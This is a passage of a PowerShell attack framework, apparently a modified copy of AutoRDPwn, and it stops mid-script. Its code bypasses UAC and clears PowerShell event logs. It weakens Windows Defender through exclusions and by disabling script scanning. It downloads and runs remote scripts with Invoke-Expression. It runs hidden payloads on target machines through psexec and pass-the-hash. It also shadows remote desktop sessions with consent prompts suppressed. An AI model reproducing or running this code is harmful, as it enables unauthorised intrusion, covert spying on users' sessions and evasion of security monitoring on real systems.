[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8") ; $OSVersion = [Environment]::OSVersion.Platform ; $ErrorActionPreference = "SilentlyContinue"
$noadmin=$args[0] ; $nogui=$args[1] ; $lang=$args[2] ; $option=$args[4] ; $shadowoption=$args[6] ; $createuser=$args[8] ; $noclean=$args[9] ; if($args[1,2,3,4,5,6]){ if(!$args[7]) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
$checkpath = Get-ChildItem $pwd\resources\Scripts ; if ($? -eq $true){ $local = "True" ; $localpath = $pwd ; Get-ChildItem -Path $localpath -Recurse | Unblock-File }
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy() ; [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials ; $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12' ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols

if ($OSVersion -like 'Win*'){ if ($local){ Import-Module $localpath\Resources\Scripts\AutoBypass.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/AutoBypass.ps1')}
if ($local){ Import-Module $localpath\Resources\Design\NinjaStyle.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/NinjaStyle.ps1')}
if ($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { if ($local){ Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass Start-Process powershell -NoNewWindow -WorkingDirectory $localpath -ArgumentList $PSCommandPath $args" ; exit }
else { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath $args" ; exit }}}

$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v5.1 - by @JoelGMSec" ; $ProgressPreference = "SilentlyContinue" ; Set-StrictMode -Off ; $LogEngineLifeCycleEvent=$false ; $LogEngineHealthEvent=$false ; $LogProviderLifeCycleEvent=$false ; $LogProviderHealthEvent=$false ; Clear-EventLog "Windows PowerShell"
$Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'

if ($local){ Import-Module $localpath\Resources\Design\Disable-Close.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Disable-Close.ps1')}
if (!$local){ (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/AutoRDPwn.ico","AutoRDPwn.ico")}
if (!$local){ (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Set-ConsoleIcon.ps1","Set-ConsoleIcon.ps1")}
if ($local){ .\Resources\Design\Set-ConsoleIcon.ps1 .\Resources\Design\AutoRDPwn.ico } if (!$local){ .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico }}

function Show-Banner { Clear-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if($nogui -like '-nogui') { $null } else { 
     Write-Host
     Write-Host "    ___          __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "_________ _________ ________ " -NoNewLine -ForegroundColor Blue ; Write-Host "               " -ForegroundColor Green
     Write-Host "  /  _  \  __ __|  |_ ___ " -NoNewLine -ForegroundColor Magenta ; Write-Host "\______   \_______  \______  \" -NoNewLine -ForegroundColor Blue ; Write-Host "  _  ___ ___  " -ForegroundColor Green
     Write-Host " /  / \  \|  |  |   _| _  \" -NoNewLine -ForegroundColor Magenta ; Write-Host "|       _/| |    \  |    ___/" -NoNewLine -ForegroundColor Blue ; Write-Host "\/ \/  /     \ " -ForegroundColor Green
     Write-Host "/  /___\  \  |  |  |  (_)  " -NoNewLine -ForegroundColor Magenta ; Write-Host "|   |    \| |____/  |   |" -NoNewLine -ForegroundColor Blue ; Write-Host " \        /   |   \" -ForegroundColor Green
     Write-Host "\  _______/_____/__|\_____/" -NoNewLine -ForegroundColor Magenta ; Write-Host "|___|__  /_________/|___|" -NoNewLine -ForegroundColor Blue ; Write-Host "  \__/\__/|___|_  /" -ForegroundColor Green
     Write-Host " \/                        " -NoNewLine -ForegroundColor Magenta ; Write-Host "       \/                " -NoNewLine -ForegroundColor Blue ; Write-Host "                \/ " -ForegroundColor Green
     Write-Host
     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
     Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  The Shadow Attack Framework" -NoNewLine -ForegroundColor Yellow ; Write-Host "  :: " -NoNewLine -ForegroundColor Gray ; Write-Host "v5.1" -NoNewLine -ForegroundColor Yellow ; Write-Host " ::" -NoNewLine -ForegroundColor Gray ; Write-Host "  Created by @JoelGMSec" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
     Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  https://github.com/JoelGMSec/AutoRDPwn" -NoNewLine -ForegroundColor Yellow ; Write-Host " :: " -NoNewLine -ForegroundColor Gray ; Write-Host "https://darkbyte.net" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
     Write-Host }}

function Show-Language { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-nogui') { $null } else {
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - English" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Spanish" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - French" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - German" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Italian" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Russian" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - Portuguese" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "H" -NoNewLine -ForegroundColor Blue ; Write-Host "] - Help" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - Exit" -ForegroundColor Gray
     Write-Host }}

function Show-Menu { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-nogui') { $null } else {
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - PSexec (SMB)" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Pass the Hash (SMB)" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Management Instrumentation (WMI)" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Remote Management (WinRM)" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Remote Assistance (WinRS)" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Local Session Hijacking (TSCon)" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Desktop Execution (RDP)" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt1" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
     Write-Host }}

function Show-Modules { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-nogui') { $null } else {
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt17" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt50" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Networking / Pivoting" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Desktop Forensics" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt64" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt68" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt69" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
     Write-Host }}

function ConvertFrom-SecureToPlain {
    param([Parameter(Mandatory=$true)][System.Security.SecureString] $SecurePassword)
    $PasswordPointer = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
    $PlainTextPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto($PasswordPointer)
    [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($PasswordPointer)
    $PlainTextPassword }

function Read-PlainText {
    # visible input: characters echo as typed (Enter=accept, Backspace=erase, Esc=cancel)
    $buffer = New-Object System.Text.StringBuilder ; try {
    while ($true) { $key = [System.Console]::ReadKey($true)
        if($key.Key -eq [System.ConsoleKey]::Enter) { Write-Host ; return $buffer.ToString() }
        if($key.Key -eq [System.ConsoleKey]::Backspace) { if($buffer.Length -gt 0){ [void]$buffer.Remove($buffer.Length-1,1) ; Write-Host "`b `b" -NoNewLine }}
        elseif($key.Key -eq [System.ConsoleKey]::Escape) { Write-Host ; return "" }
        elseif([int]$key.KeyChar -ge 32) { [void]$buffer.Append($key.KeyChar) ; Write-Host $key.KeyChar -NoNewLine }}}
    catch { return $Host.UI.ReadLine() }}

function Resolve-TargetUser {
    # .\user becomes COMPUTER\user so local target accounts work everywhere; DOMAIN\user and UPN pass through
    # con IP se busca el nombre real (DNS inverso, luego NetBIOS). Si no hay nombre, se deja .\usuario tal cual:
    # el formato IP\usuario rompe el logon local (el dominio no puede ser una IP), asi que nunca se usa
    param($user, $computer)
    if(!$user){ return $null }
    if($user -like '.\*'){ $hname = $null
        if($computer -match '^\d+\.\d+\.\d+\.\d+$'){ try { $hname = ([System.Net.Dns]::GetHostEntry($computer).HostName -split '\.')[0] } catch { $hname = $null }
            if(!$hname){ try { $nb = nbtstat -A $computer 2>$null | Out-String ; if($nb -match '(?m)^\s*([^\s<]+)\s*<00>\s*UNIQUE'){ $hname = $matches[1].trim() } } catch { $hname = $null } } }
        else { $hname = $computer }
        if($hname){ return "$hname\$($user.substring(2))" }
        return $user }
    return $user }

function Start-RemoteViewer {
    # stored credential via cmdkey: mstsc /shadow with /prompt is what breaks local/domain accounts
    param($computer, $user, $PlainTextPassword, $control, $shadow, $sticky, $vncserver)
    if($vncserver){ $port = 5900 } else { $port = 3389 }
    $open = Test-RemoteTcp -Computer $computer -Port $port -TimeoutMs 1500
    if($open -eq $false){ Write-Host ; Write-Host "[!] Puerto $port cerrado en $computer.. revisa firewall o el servicio" -ForegroundColor Red ; Start-Sleep -Milliseconds 400 }
    if($vncserver){ if($control -eq 'false'){ return Start-Process .\VNCViewer.exe -ArgumentList "/password AutoRDPwn /viewonly $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor" -PassThru }
    else { return Start-Process .\VNCViewer.exe -ArgumentList "/password AutoRDPwn $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor" -PassThru }}
    if($sticky){ return Start-Process mstsc -ArgumentList "/v $computer /admin /f" -PassThru }
    if($user -and $PlainTextPassword){ cmdkey /add:$computer /user:$user /pass:$PlainTextPassword 2>&1> $null }
    if($control -eq 'true'){ return Start-Process mstsc -ArgumentList "/v $computer /shadow:$shadow /control /noconsentprompt /f" -PassThru }
    return Start-Process mstsc -ArgumentList "/v $computer /shadow:$shadow /noconsentprompt /f" -PassThru }

function Test-Command {
    Param ($command)
    $oldPreference = $ErrorActionPreference
    $ErrorActionPreference = 'stop'
    try {if(Get-Command $command){RETURN $true}}
    Catch {RETURN $false}
    Finally {$ErrorActionPreference=$oldPreference}}

function Test-RemoteTcp {
    # bounded TCP probe: instant when the port is open, no ICMP/DNS wait like Test-NetConnection (seconds)
    param($Computer, $Port, $TimeoutMs = 1500)
    try { $client = New-Object System.Net.Sockets.TcpClient ; $async = $client.BeginConnect($Computer, $Port, $null, $null)
        $ok = $async.AsyncWaitHandle.WaitOne($TimeoutMs) ; $connected = $client.Connected ; $client.Close()
        if($ok -and $connected){ return $true } ; return $false }
    catch { return $false }}

function Read-TuiMenu {
    # TUI selector: flechas + Enter (teclas 1-9/M/X tambien valen), Esc = cancelar; devuelve la tecla o $null
    param([string[]]$Keys, [string[]]$Labels, [int]$Start = 0)
    $sel = $Start ; $base = [Console]::CursorTop
    try { while($true){
        for($i=0; $i -lt $Keys.Count; $i++){ [Console]::SetCursorPosition(2, $base + $i)
            if($i -eq $sel){ Write-Host "> [$($Keys[$i])] $($Labels[$i])" -ForegroundColor Black -BackgroundColor Green }
            else { Write-Host "  [$($Keys[$i])] $($Labels[$i])   " -ForegroundColor Gray } }
        $k = [Console]::ReadKey($true)
        if($k.Key -eq 'UpArrow'){ $sel = $(if($sel -le 0){ $Keys.Count - 1 } else { $sel - 1 }) }
        elseif($k.Key -eq 'DownArrow'){ $sel = $(if($sel -ge $Keys.Count - 1){ 0 } else { $sel + 1 }) }
        elseif($k.Key -eq 'Enter'){ [Console]::SetCursorPosition(0, $base + $Keys.Count) ; return $Keys[$sel] }
        elseif($k.Key -eq 'Escape'){ [Console]::SetCursorPosition(0, $base + $Keys.Count) ; return $null }
        else { $c = "$($k.KeyChar)".ToUpper() ; if($Keys -contains $c){ [Console]::SetCursorPosition(0, $base + $Keys.Count) ; return $c } } } }
    catch { return $Host.UI.ReadLine() }}

function Get-AttackHint {
    # escanea los puertos clave del objetivo y sugiere el ataque viable para ese estado
    param($Computer)
    $p135 = Test-RemoteTcp -Computer $Computer -Port 135 -TimeoutMs 2500 ; $p445 = Test-RemoteTcp -Computer $Computer -Port 445 -TimeoutMs 2500
    $p3389 = Test-RemoteTcp -Computer $Computer -Port 3389 -TimeoutMs 2500 ; $p5985 = Test-RemoteTcp -Computer $Computer -Port 5985 -TimeoutMs 2500
    $list = "135=$([int]$p135) 445=$([int]$p445) 3389=$([int]$p3389) 5985=$([int]$p5985)"
    $sug = if($p5985){ '4/5 (WinRM/WinRS)' } elseif($p445){ '1/2 (SMB)' } elseif($p135){ '3 (WMI/DCOM)' } elseif($p3389){ '7 (SharpRDP, via RDP)' } else { 'ninguno (revisa la red/VPN)' }
    Write-Host "[i] Puertos del objetivo: $list -- ataque recomendado: $sug" -ForegroundColor DarkGray }

function Remove-Exclusions { 
    $exclusion = Get-MpPreference ; $exclusion.exclusionprocess | % { Remove-MpPreference -ExclusionProcess $_ 2>&1> $null }
    $exclusion = Get-MpPreference ; $exclusion.exclusionpath | % { Remove-MpPreference -ExclusionPath $_ 2>&1> $null }
    $exclusion = Get-MpPreference ; $exclusion.exclusionextension | % { Remove-MpPreference -ExclusionExtension $_ 2>&1> $null }
    Set-MpPreference -DisableIOAVProtection 0 2>&1> $null ; Clear-Item -Path WSMan:\localhost\Client\Trustedhosts -Force 2>&1> $null 
    Set-MpPreference -SubmitSamplesConsent 1 2>&1> $null ; Set-MpPreference -MAPSReporting 2 2>&1> $null ; Set-MpPreference -DisableScriptScanning 0 2>&1> $null }

    $question = { Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine -ForegroundColor Gray }
    $system = (Get-WmiObject Win32_OperatingSystem).OSArchitecture ; if(!$nogui){ 
    $help = "The detailed guide of use can be found at the following link:"

    do { Show-Banner ; Show-Language ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
    $Random = New-Object System.Random ; "Choose your language:` " -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_CursorTop() ; $input = $Host.UI.ReadLine() ; switch ($input) {

       '1' { $language = 'English' }
       '2' { $language = 'Spanish' }
       '3' { $language = 'French' }
       '4' { $language = 'German' }
       '5' { $language = 'Italian' }
       '6' { $language = 'Russian' }
       '7' { $language = 'Portuguese' }
       'H' { Write-Host ; Write-Host "[i] $help" -ForegroundColor Green ; Write-Host ; Write-Host "https://darkbyte.net/autordpwn-la-guia-definitiva" -ForegroundColor Blue ; Start-Sleep -milliseconds 7500 
           (New-Object -Com Shell.Application).Open("https://darkbyte.net/autordpwn-la-guia-definitiva")}
       'X' { return }

    default { $langui = (Get-Culture).Name ; if (!$input) { $Host.UI.RawUI.ForegroundColor = 'Gray'
    if ($langui -like 'en*') { $input = '1' ; $language = 'English' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "1" -ForegroundColor Green }
    if ($langui -like 'es*') { $input = '2' ; $language = 'Spanish' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "2" -ForegroundColor Green }
    if ($langui -like 'fr*') { $input = '3' ; $language = 'French' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "3" -ForegroundColor Green }
    if ($langui -like 'de*') { $input = '4' ; $language = 'German' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "4" -ForegroundColor Green }
    if ($langui -like 'it*') { $input = '5' ; $language = 'Italian' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "5" -ForegroundColor Green }
    if ($langui -like 'ru*') { $input = '6' ; $language = 'Russian' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "6" -ForegroundColor Green }
    if ($langui -like 'pt*') { $input = '7' ; $language = 'Portuguese' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "7" -ForegroundColor Green }}
    else { Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} else { continue }}} until ($input -in '1','2','3','4','5','6','7','X')}

    if($lang -like '-lang') { $language=$args[3] }
    if($language -in 'English') { if ($local){ Import-Module .\Resources\Languages\English.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/English.ps1')}}
    if($language -in 'Spanish') { if ($local){ Import-Module .\Resources\Languages\Spanish.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Spanish.ps1')}}
    if($language -in 'French') { if ($local){ Import-Module .\Resources\Languages\French.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/French.ps1')}}
    if($language -in 'German') { if ($local){ Import-Module .\Resources\Languages\German.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/German.ps1')}}
    if($language -in 'Italian') { if ($local){ Import-Module .\Resources\Languages\Italian.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Italian.ps1')}}
    if($language -in 'Russian') { if ($local){ Import-Module .\Resources\Languages\Russian.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Russian.ps1')}}
    if($language -in 'Portuguese') { if ($local){ Import-Module .\Resources\Languages\Portuguese.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Portuguese.ps1')}}
    
    $powershell = $host.version ; if($powershell.major -lt 4) { Write-Host ; Write-Host "[!] $txt3" -ForegroundColor 'Red' ; Write-Host
    Write-Host "[!] $txt4" -NoNewLine -ForegroundColor 'Red' ; Write-Host -NoNewLine ; Write-Host " https://aka.ms/pscore6" -ForegroundColor 'Blue' ; Write-Host ; Start-Sleep -milliseconds 7500 ; exit }
    Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null; Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null ; Set-MpPreference -DisableScriptScanning 1 2>&1> $null
    Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 1 2>&1> $null ; Set-MpPreference -SubmitSamplesConsent 0 2>&1> $null ; Set-MpPreference -MAPSReporting 0 2>&1> $null

    $mem_computer = $null ; $mem_user = $null ; $mem_pass = $null ; $reload = 'true' ; do {
    do { Show-Banner ; if($mem_computer){ Write-Host "[i] Ultimo objetivo: $(if($mem_user){$mem_user}else{'usuario actual'}) @ $mem_computer  (Enter = reutilizar | 0 = volver en los prompts)" -ForegroundColor DarkGray }
    $currentuser = [Environment]::username ; if($option -like '-option') { $input=$args[5] } else { Write-Host ; & $question ; Write-Host "$txt7" -ForegroundColor Gray
    $input = Read-TuiMenu -Keys @('1','2','3','4','5','6','7','M','X') -Labels @('PSexec (SMB)','Pass the Hash (SMB)','Windows Management Instrumentation (WMI)','Windows Remote Management (WinRM)','Windows Remote Assistance (WinRS)','Local Session Hijacking (TSCon)','Remote Desktop Execution (RDP)',"$txt1","$txt2") ; $Host.UI.RawUI.ForegroundColor = 'Green' ; if(!$input){ $input = 'X' }} ; switch ($input) {

        '1' {
        if($option) { $computer='localhost' } else {
        Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $computer = $Host.UI.ReadLine() ; if($computer -in '0','b','back','volver','atras'){ $input = 'volver' ; break }
        if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_computer){ $computer = $mem_computer } else { $computer = 'localhost' }
        & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host $computer } ; $mem_computer = $computer
        Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_user){ $user = $mem_user }
        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; if($user){ Write-Host $user } else { Write-Host $currentuser }} ; $mem_user = $user
        $user = Resolve-TargetUser $user $computer
        Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        do { $PlainTextPassword = Read-PlainText ; if(!$PlainTextPassword -and $mem_pass){ $PlainTextPassword = $mem_pass ; Write-Host "[i] Usando la clave guardada" -ForegroundColor DarkGray }
        $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; if($PlainTextPassword){ $mem_pass = $PlainTextPassword }
        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword ) }
        if(!(Test-RemoteTcp -Computer $computer -Port 445 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 445 (SMB) esta cerrado en ${computer}.. este ataque no puede funcionar" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
        $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-PSexec.ps1 } else {
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PSexec.ps1')}
        if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn1" -nobanner -accepteula
        .\psexec.exe \\$computer -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn2" -nobanner -accepteula
        .\psexec.exe \\$computer -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn3" -nobanner -accepteula
        .\psexec.exe \\$computer -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn4" -nobanner -accepteula }
        if($user) { .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn1" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn2" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn3" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -noprofile -windowstyle hidden "$Pwn4" -nobanner -accepteula }
        del .\psexec.exe 2>&1> $null }

        '2' {
        Write-Host ; & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $computer = $Host.UI.ReadLine() ; if($computer -in '0','b','back','volver','atras'){ $input = 'volver' ; break }
        if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_computer){ $computer = $mem_computer } else { $computer = 'localhost' }
        & $question ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host $computer } ; $mem_computer = $computer
        Write-Host ; & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop") ; if($mem_user){ $user = $mem_user }
        & $question ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; if($user){ Write-Host $user } else { $user = $currentuser ; Write-Host $currentuser }} ; $mem_user = $user
        Write-Host ; & $question ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $domain = $Host.UI.ReadLine() ; if(!$domain) { [Console]::SetCursorPosition(0,"$cursortop")
        $domain = 'localhost' ; & $question ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
        do { Write-Host ; & $question ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray ; $hash = $Host.UI.ReadLine()
        if(!$hash) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $hash )
        if(!(Test-RemoteTcp -Computer $computer -Port 445 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 445 (SMB) esta cerrado en ${computer}.. este ataque no puede funcionar" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
